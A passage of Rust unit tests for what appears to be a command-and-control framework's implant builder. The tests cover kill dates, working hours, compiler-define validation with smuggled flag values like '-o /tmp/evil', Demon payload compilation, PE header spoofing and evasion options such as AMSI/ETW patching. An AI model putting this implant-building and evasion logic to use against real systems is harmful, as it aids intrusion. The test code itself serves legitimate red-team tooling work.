            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "WorkingHours end must be after the start"
        ));
    }

    #[test]
    fn parse_working_hours_rejects_equal_start_and_end() {
        let err = parse_working_hours(Some("10:30-10:30"));
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "WorkingHours end must be after the start"
        ));
    }

    #[test]
    fn parse_working_hours_rejects_missing_separator() {
        let err = parse_working_hours(Some("0800"));
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "WorkingHours must use `HH:MM-HH:MM`"
        ));
    }

    #[test]
    fn parse_working_hours_rejects_junk_input() {
        let err = parse_working_hours(Some("junk"));
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "WorkingHours must use `HH:MM-HH:MM`"
        ));
    }

    #[test]
    fn parse_working_hours_rejects_wrong_separator_format() {
        // Colon-separated only, no dash separator
        let err = parse_working_hours(Some("08:00:17:00"));
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "WorkingHours must use `HH:MM-HH:MM`"
        ));
    }

    #[test]
    fn validate_define_accepts_bare_name() {
        assert!(validate_define("SHELLCODE").is_ok());
        assert!(validate_define("TRANSPORT_HTTP").is_ok());
        assert!(validate_define("_PRIVATE").is_ok());
    }

    #[test]
    fn validate_define_accepts_name_equals_value() {
        assert!(validate_define("FOO=bar").is_ok());
        assert!(validate_define("CONFIG_BYTES={0x00\\,0x01}").is_ok());
        assert!(validate_define("LEVEL=1").is_ok());
    }

    #[test]
    fn validate_define_rejects_empty() {
        let err = validate_define("");
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message.contains("must not be empty")
        ));
    }

    #[test]
    fn validate_define_rejects_leading_dash() {
        let err = validate_define("-o /tmp/evil");
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message.contains("must not begin with `-`")
        ));
    }

    #[test]
    fn validate_define_rejects_whitespace_in_value() {
        let err = validate_define("FOO=bar baz");
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message.contains("must not contain whitespace")
        ));
    }

    #[test]
    fn validate_define_rejects_whitespace_in_name() {
        let err = validate_define("FOO BAR=1");
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message.contains("must not contain whitespace")
        ));
    }

    #[test]
    fn validate_define_rejects_name_starting_with_digit() {
        let err = validate_define("1FOO=1");
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message.contains("alphanumeric characters and underscores")
        ));
    }

    #[test]
    fn validate_define_rejects_name_with_hyphen() {
        let err = validate_define("FOO-BAR=1");
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message.contains("alphanumeric characters and underscores")
        ));
    }

    #[test]
    fn validate_define_rejects_embedded_flag_injection() {
        // Value contains a space followed by a flag — rejected due to whitespace rule
        let err = validate_define("FOO=1 -o /tmp/evil");
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message.contains("must not contain whitespace")
        ));
    }

    #[test]
    fn parse_kill_date_accepts_positive_timestamp() -> Result<(), Box<dyn std::error::Error>> {
        assert_eq!(parse_kill_date(Some("1234"))?, 1234);
        Ok(())
    }

    #[test]
    fn parse_kill_date_rejects_negative_timestamp() {
        let err = parse_kill_date(Some("-1"));
        assert!(matches!(
            err,
            Err(PayloadBuildError::InvalidRequest { message })
                if message == "KillDate `-1` must be a non-negative unix timestamp"
        ));
    }

    #[test]
    fn parse_hour_minute_accepts_max_valid_time() -> Result<(), Box<dyn std::error::Error>> {
        let (h, m) = parse_hour_minute("23:59")?;
        assert_eq!(h, 23);
        assert_eq!(m, 59);
        Ok(())
    }

    #[test]
    fn parse_hour_minute_rejects_hour_24() {
        let err = parse_hour_minute("24:00");
        assert!(matches!(err, Err(PayloadBuildError::InvalidRequest { .. })));
    }

    #[test]
    fn parse_hour_minute_rejects_minute_60() {
        let err = parse_hour_minute("00:60");
        assert!(matches!(err, Err(PayloadBuildError::InvalidRequest { .. })));
    }

    #[test]
    fn parse_hour_minute_rejects_24_60() {
        let err = parse_hour_minute("24:60");
        assert!(matches!(err, Err(PayloadBuildError::InvalidRequest { .. })));
    }

    #[test]
    fn add_bytes_writes_length_prefixed_data() -> Result<(), PayloadBuildError> {
        let mut buf = Vec::new();
        add_bytes(&mut buf, b"hello")?;
        assert_eq!(&buf[..4], &5_u32.to_le_bytes());
        assert_eq!(&buf[4..], b"hello");
        Ok(())
    }

    #[test]
    fn add_bytes_returns_error_for_empty_after_wstring() -> Result<(), PayloadBuildError> {
        let mut buf = Vec::new();
        add_wstring(&mut buf, "")?;
        assert_eq!(&buf[..4], &2_u32.to_le_bytes(), "empty string still has null terminator");
        Ok(())
    }

    fn read_u32(cursor: &mut &[u8]) -> Result<u32, PayloadBuildError> {
        let bytes = take(cursor, 4)?;
        let array: [u8; 4] = bytes.try_into().map_err(|_| PayloadBuildError::InvalidRequest {
            message: "test parser failed to decode u32".to_owned(),
        })?;
        Ok(u32::from_le_bytes(array))
    }

    fn read_u64(cursor: &mut &[u8]) -> Result<u64, PayloadBuildError> {
        let bytes = take(cursor, 8)?;
        let array: [u8; 8] = bytes.try_into().map_err(|_| PayloadBuildError::InvalidRequest {
            message: "test parser failed to decode u64".to_owned(),
        })?;
        Ok(u64::from_le_bytes(array))
    }

    fn read_wstring(cursor: &mut &[u8]) -> Result<String, PayloadBuildError> {
        let byte_len =
            usize::try_from(read_u32(cursor)?).map_err(|_| PayloadBuildError::InvalidRequest {
                message: "test parser string length overflow".to_owned(),
            })?;
        let bytes = take(cursor, byte_len)?;
        if bytes.len() < 2 || bytes[bytes.len() - 2..] != [0, 0] {
            return Err(PayloadBuildError::InvalidRequest {
                message: "test parser missing UTF-16 terminator".to_owned(),
            });
        }

        let units = bytes[..bytes.len() - 2]
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<_>>();
        String::from_utf16(&units).map_err(|error| PayloadBuildError::InvalidRequest {
            message: format!("test parser invalid UTF-16: {error}"),
        })
    }

    fn take<'a>(cursor: &mut &'a [u8], len: usize) -> Result<&'a [u8], PayloadBuildError> {
        if cursor.len() < len {
            return Err(PayloadBuildError::InvalidRequest {
                message: "test parser reached end of buffer".to_owned(),
            });
        }
        let (head, tail) = cursor.split_at(len);
        *cursor = tail;
        Ok(head)
    }

    fn constructor_test_profile(compiler_x64: &Path, compiler_x86: &Path, nasm: &Path) -> Profile {
        Profile {
            teamserver: red_cell_common::config::TeamserverConfig {
                host: "127.0.0.1".to_owned(),
                port: 40056,
                plugins_dir: None,
                max_download_bytes: None,
                max_registered_agents: None,
                drain_timeout_secs: None,
                agent_timeout_secs: None,
                logging: None,
                cert: None,
                build: Some(red_cell_common::config::BuildConfig {
                    compiler64: Some(compiler_x64.display().to_string()),
                    compiler86: Some(compiler_x86.display().to_string()),
                    nasm: Some(nasm.display().to_string()),
                }),
            },
            operators: red_cell_common::config::OperatorsConfig {
                users: BTreeMap::from([(
                    "operator".to_owned(),
                    red_cell_common::config::OperatorConfig {
                        password: "password".to_owned(),
                        role: red_cell_common::config::OperatorRole::Admin,
                    },
                )]),
            },
            listeners: red_cell_common::config::ListenersConfig::default(),
            demon: DemonConfig {
                sleep: Some(5),
                jitter: Some(10),
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                allow_legacy_ctr: false,
            },
            service: None,
            api: None,
            webhook: None,
        }
    }

    fn create_payload_assets(repo_root: &Path) -> Result<(), Box<dyn std::error::Error>> {
        let payload_root = repo_root.join("src/Havoc/payloads");
        std::fs::create_dir_all(payload_root.join("Demon"))?;
        std::fs::write(payload_root.join("Shellcode.x64.bin"), [0x90, 0x90])?;
        std::fs::write(payload_root.join("Shellcode.x86.bin"), [0x90, 0x90])?;
        std::fs::write(payload_root.join("DllLdr.x64.bin"), [0x55, 0x48])?;
        let templates_dir = repo_root.join("payloads/templates");
        std::fs::create_dir_all(&templates_dir)?;
        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;
        Ok(())
    }

    /// Write a fake executable that prints `output` on stdout then exits 0.
    fn write_fake_executable_with_output(
        path: &Path,
        output: &str,
    ) -> Result<PathBuf, Box<dyn std::error::Error>> {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::write(path, format!("#!/bin/sh\nprintf '%s\\n' '{}'\nexit 0\n", output))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755))?;
        }
        Ok(path.to_path_buf())
    }

    /// Write a fake MinGW GCC that reports version 12.2.0.
    fn write_fake_gcc(path: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
        write_fake_executable_with_output(
            path,
            "x86_64-w64-mingw32-gcc (GCC) 12.2.0 20220819 (Release)",
        )
    }

    /// Write a fake NASM that reports version 2.16.01.
    fn write_fake_nasm(path: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
        write_fake_executable_with_output(path, "NASM version 2.16.01 compiled on Jan  1 2023")
    }

    #[test]
    fn parse_hour_minute_accepts_zero() -> Result<(), Box<dyn std::error::Error>> {
        let (h, m) = parse_hour_minute("00:00")?;
        assert_eq!(h, 0);
        assert_eq!(m, 0);
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_rejects_unsupported_listener_protocol()
    -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "dns".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Dns(red_cell_common::DnsListenerConfig {
            name: "dns".to_owned(),
            host_bind: "0.0.0.0".to_owned(),
            port_bind: 53,
            domain: "c2.local".to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        });

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("invalid request should be rejected");
        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_rejects_unsupported_agent_type() -> Result<(), Box<dyn std::error::Error>>
    {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Shellcode".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }));

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("invalid request should be rejected");
        match error {
            PayloadBuildError::InvalidRequest { message } => {
                assert!(message.contains("unsupported agent type `Shellcode`"));
            }
            other => panic!("expected invalid request, got {other:?}"),
        }
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_archon_rejects_missing_source_tree()
    -> Result<(), Box<dyn std::error::Error>> {
        // `disabled_for_tests` points archon_source_root at a non-existent path.
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Archon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }));

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("missing archon source tree should be rejected");
        assert!(
            matches!(error, PayloadBuildError::ToolchainUnavailable { .. }),
            "expected ToolchainUnavailable, got {error:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_rejects_unsupported_architecture()
    -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "arm64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }));

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("invalid request should be rejected");
        match error {
            PayloadBuildError::InvalidRequest { message } => {
                assert!(message.contains("unsupported architecture `arm64`"));
            }
            other => panic!("expected invalid request, got {other:?}"),
        }
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_rejects_unsupported_output_format()
    -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Linux Elf".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }));

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("invalid request should be rejected");
        match error {
            PayloadBuildError::InvalidRequest { message } => {
                assert!(message.contains("unsupported output format `Linux Elf`"));
            }
            other => panic!("expected invalid request, got {other:?}"),
        }
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_uses_toolchain_and_returns_compiled_bytes()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let bin_dir = temp.path().join("bin");
        let source_root = temp.path().join("src/Havoc/payloads/Demon");
        let shellcode_root = temp.path().join("src/Havoc/payloads");
        let cache_dir = temp.path().join("payload-cache");
        std::fs::create_dir_all(&bin_dir)?;
        std::fs::create_dir_all(source_root.join("src/core"))?;
        std::fs::create_dir_all(source_root.join("src/crypt"))?;
        std::fs::create_dir_all(source_root.join("src/inject"))?;
        std::fs::create_dir_all(source_root.join("src/asm"))?;
        std::fs::create_dir_all(source_root.join("src/main"))?;
        std::fs::create_dir_all(source_root.join("include"))?;
        std::fs::create_dir_all(&shellcode_root)?;
        std::fs::write(source_root.join("src/core/a.c"), "int x = 1;")?;
        std::fs::write(source_root.join("src/asm/test.x64.asm"), "bits 64")?;
        std::fs::write(source_root.join("src/main/MainExe.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainSvc.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainDll.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/Demon.c"), "int demo = 1;")?;
        std::fs::write(shellcode_root.join("Shellcode.x64.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("Shellcode.x86.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("DllLdr.x64.bin"), [0x55, 0x48])?;
        let templates_dir = temp.path().join("payloads/templates");
        std::fs::create_dir_all(&templates_dir)?;
        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;

        let nasm = bin_dir.join("nasm");
        let gcc = bin_dir.join("x86_64-w64-mingw32-gcc");
        std::fs::write(
            &nasm,
            "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\necho nasm-ok\n",
        )?;
        std::fs::write(
            &gcc,
            "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload' > \"$1\"; break; fi; shift; done\necho gcc-ok\n",
        )?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&nasm, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc, std::fs::Permissions::from_mode(0o755))?;
        }

        let unknown_version =
            ToolchainVersion { major: 0, minor: 0, patch: 0, raw: "0.0.0".to_owned() };
        let service = PayloadBuilderService::with_paths_for_tests(
            Toolchain {
                compiler_x64: gcc.clone(),
                compiler_x64_version: unknown_version.clone(),
                compiler_x86: gcc,
                compiler_x86_version: unknown_version.clone(),
                nasm,
                nasm_version: unknown_version,
            },
            source_root,
            temp.path().join("agent/archon"),
            shellcode_root.join("Shellcode.x64.bin"),
            shellcode_root.join("Shellcode.x86.bin"),
            shellcode_root.join("DllLdr.x64.bin"),
            templates_dir.join("MainStager.c"),
            DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                allow_legacy_ctr: false,
            },
            None,
            cache_dir,
        );
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }));

        let mut messages = Vec::new();
        let artifact = service
            .build_payload(&listener, &request, |message| messages.push(message.message))
            .await?;
        assert_eq!(artifact.bytes, b"payload");
        assert_eq!(artifact.file_name, "demon.x64.exe");
        assert!(messages.iter().any(|line| line.contains("nasm-ok")));
        assert!(messages.iter().any(|line| line.contains("gcc-ok")));
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_x86_uses_x86_compiler_and_win32_nasm_format()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let bin_dir = temp.path().join("bin");
        let cache_dir = temp.path().join("payload-cache");
        let source_root = temp.path().join("src/Havoc/payloads/Demon");
        let shellcode_root = temp.path().join("src/Havoc/payloads");
        let nasm_args = temp.path().join("nasm.args");
        let gcc_x64_args = temp.path().join("gcc-x64.args");
        let gcc_x86_args = temp.path().join("gcc-x86.args");
        std::fs::create_dir_all(&bin_dir)?;
        std::fs::create_dir_all(source_root.join("src/core"))?;
        std::fs::create_dir_all(source_root.join("src/crypt"))?;
        std::fs::create_dir_all(source_root.join("src/inject"))?;
        std::fs::create_dir_all(source_root.join("src/asm"))?;
        std::fs::create_dir_all(source_root.join("src/main"))?;
        std::fs::create_dir_all(source_root.join("include"))?;
        std::fs::create_dir_all(&shellcode_root)?;
        std::fs::write(source_root.join("src/core/a.c"), "int x = 1;")?;
        std::fs::write(source_root.join("src/asm/test.x86.asm"), "bits 32")?;
        std::fs::write(source_root.join("src/main/MainExe.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainSvc.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainDll.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/Demon.c"), "int demo = 1;")?;
        std::fs::write(shellcode_root.join("Shellcode.x64.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("Shellcode.x86.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("DllLdr.x64.bin"), [0x55, 0x48])?;
        let templates_dir = temp.path().join("payloads/templates");
        std::fs::create_dir_all(&templates_dir)?;
        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;

        let nasm = bin_dir.join("nasm");
        let gcc_x64 = bin_dir.join("x86_64-w64-mingw32-gcc");
        let gcc_x86 = bin_dir.join("i686-w64-mingw32-gcc");
        std::fs::write(
            &nasm,
            format!(
                "#!/bin/sh\nprintf '%s\n' \"$@\" > '{}'\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\necho nasm-x86-ok\n",
                nasm_args.display()
            ),
        )?;
        std::fs::write(
            &gcc_x64,
            format!(
                "#!/bin/sh\nprintf '%s\n' \"$@\" > '{}'\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload-x64' > \"$1\"; break; fi; shift; done\necho gcc-x64-ok\n",
                gcc_x64_args.display()
            ),
        )?;
        std::fs::write(
            &gcc_x86,
            format!(
                "#!/bin/sh\nprintf '%s\n' \"$@\" > '{}'\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload-x86' > \"$1\"; break; fi; shift; done\necho gcc-x86-ok\n",
                gcc_x86_args.display()
            ),
        )?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&nasm, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc_x64, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc_x86, std::fs::Permissions::from_mode(0o755))?;
        }

        let unknown_version =
            ToolchainVersion { major: 0, minor: 0, patch: 0, raw: "0.0.0".to_owned() };
        let service = PayloadBuilderService::with_paths_for_tests(
            Toolchain {
                compiler_x64: gcc_x64,
                compiler_x64_version: unknown_version.clone(),
                compiler_x86: gcc_x86,
                compiler_x86_version: unknown_version.clone(),
                nasm,
                nasm_version: unknown_version,
            },
            source_root,
            temp.path().join("agent/archon"),
            shellcode_root.join("Shellcode.x64.bin"),
            shellcode_root.join("Shellcode.x86.bin"),
            shellcode_root.join("DllLdr.x64.bin"),
            templates_dir.join("MainStager.c"),
            DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                allow_legacy_ctr: false,
            },
            None,
            cache_dir,
        );
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x86".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }));

        let artifact = service.build_payload(&listener, &request, |_| {}).await?;

        assert_eq!(artifact.bytes, b"payload-x86");
        assert_eq!(artifact.file_name, "demon.x86.exe");
        assert!(std::fs::read_to_string(&gcc_x64_args).is_err());
        let gcc_x86_args = std::fs::read_to_string(&gcc_x86_args)?;
        assert!(gcc_x86_args.contains("src/main/MainExe.c"));
        let nasm_args = std::fs::read_to_string(&nasm_args)?;
        assert!(nasm_args.contains("win32"));
        Ok(())
    }

    #[test]
    fn patch_payload_updates_pe_header_fields() -> Result<(), Box<dyn std::error::Error>> {
        let patched = patch_payload(
            sample_pe_payload(),
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: Some("MZ".to_owned()),
                    magic_mz_x86: None,
                    compile_time: Some("0x12345678".to_owned()),
                    image_size_x64: Some(0x2000),
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )?;

        let pe_offset = 0x80;
        assert_eq!(&patched[..2], b"MZ");
        assert_eq!(
            u32::from_le_bytes(patched[pe_offset + 8..pe_offset + 12].try_into()?),
            0x1234_5678
        );
        let optional_header_offset = pe_offset + 24;
        assert_eq!(
            u32::from_le_bytes(
                patched[optional_header_offset + 56..optional_header_offset + 60].try_into()?
            ),
            0x2000
        );
        Ok(())
    }

    #[test]
    fn patch_payload_rejects_invalid_compile_time() {
        let error = patch_payload(
            sample_pe_payload(),
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: None,
                    magic_mz_x86: None,
                    compile_time: Some("not-a-number".to_owned()),
                    image_size_x64: None,
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )
        .expect_err("invalid compile time should fail");

        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
    }

    #[test]
    fn patch_payload_rejects_truncated_pe_header() {
        let error = patch_payload(
            vec![0_u8; 8],
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: None,
                    magic_mz_x86: None,
                    compile_time: Some("1".to_owned()),
                    image_size_x64: None,
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )
        .expect_err("truncated pe should fail");

        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
    }

    #[test]
    fn patch_payload_rejects_non_mz_magic() {
        // ELF magic — a non-PE binary that a failed cross-compile might produce.
        let mut elf_bytes = vec![0_u8; 0x80 + 24 + 60];
        elf_bytes[..4].copy_from_slice(&[0x7F, b'E', b'L', b'F']);
        let error = patch_payload(
            elf_bytes,
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: None,
                    magic_mz_x86: None,
                    compile_time: Some("1".to_owned()),
                    image_size_x64: None,
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )
        .expect_err("non-PE binary should be rejected");

        assert!(
            matches!(&error, PayloadBuildError::InvalidRequest { message }
                if message.contains("MZ magic")),
            "unexpected error: {error}"
        );
    }

    #[test]
    fn patch_payload_rejects_empty_binary() {
        let error = patch_payload(
            vec![],
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: None,
                    magic_mz_x86: None,
                    compile_time: Some("1".to_owned()),
                    image_size_x64: None,
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )
        .expect_err("empty binary should be rejected");

        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
    }

    #[test]
    fn patch_payload_rejects_invalid_pe_signature() {
        // MZ magic present but PE\0\0 signature is wrong.
